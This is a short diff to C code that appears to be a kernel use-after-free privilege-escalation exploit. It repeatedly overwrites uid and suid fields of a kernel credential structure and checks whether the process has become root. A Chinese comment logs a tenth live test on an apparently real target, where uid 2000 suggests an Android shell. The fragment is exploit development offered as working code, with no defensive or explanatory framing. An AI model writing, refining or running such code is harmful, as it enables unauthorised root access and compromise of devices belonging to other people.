@@ -2272,15 +2272,24 @@ int uaf_plant_main(int argc, char **argv)
 		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
 		log_sync();
 		log_proc_uid(g_cred_child_pid);
+		/*
+		 * 2.0.31：第 10 次实测 installed 首次达成，但 cred_child 恒 uid=2000。
+		 * 重定向目标是 g_task（注入进程）的 cred 槽——成功时应变 root 的是
+		 * 本进程而非 cred_child。双路验证：自读 getuid()，任一路径为 0 即 rooted。
+		 */
+		dprintf(STDOUT_FILENO, "[cred] self uid=%d euid=%d\n",
+			(int)getuid(), (int)geteuid());
+		if (getuid() == 0 && geteuid() == 0)
+			rooted = 1;
 		for (int i = 0; i < 3 && fixed_uid; i++)
 			fixed_uid = one_uaf(g_cred_kva + 8);
 		for (int i = 0; i < 3 && fixed_suid; i++)
 			fixed_suid = one_uaf(g_cred_kva + 16);
-		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
+		if (!rooted && ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
 			rooted = 1;
-		else if (uid == 1 && euid == 1)
+		else if (!rooted && uid == 1 && euid == 1)
 			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
-		else
+		else if (!rooted)
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
 	}
 	if (!rooted) {
